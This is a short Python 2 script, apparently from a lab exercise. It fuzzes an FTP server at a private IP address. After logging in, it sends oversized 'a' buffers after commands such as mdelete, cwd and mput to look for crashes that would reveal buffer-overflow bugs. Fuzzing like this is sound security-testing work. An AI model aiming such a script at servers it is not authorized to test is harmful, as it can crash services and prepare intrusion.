import socket,sys
def ftp_test(ip,port1,usr,pwd):
    target = ip
    port = port1
    buf = 'a'*272
    j=1
    fuzzcmd = ['mdelete ','cd ','mkdir ','delete ','cwd ','mdir ','mput ','mls ','rename ','site index ']
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        connct = s.connect((target,port))
        print "[+] Connected!"
    except:
        print "[!] Connection Failed!"
        sys.exit(0)
    s.recv(1024)
    s.send('USER %s\r\n'%usr)
    s.recv(1024)
    s.send('PASS %s\r\n'%pwd)
    s.recv(1024)
    print "[+] Sending payload..."
    for i in fuzzcmd:
        s.send(i + buf*j + '\r\n')
        s.send(i + buf*j*4 + '\r\n')
        s.send(i + buf*j*8 + '\r\n')
        s.send(i + buf*j*40 + '\r\n')
        try:
            s.recv(1024)
            print "[!] Fuzz failed!"
        except:
            print "[+] Maybe we find a bug!"

if __name__ == '__main__':
    ftp_test("192.168.80.140",21,"2022211570","2022211570")
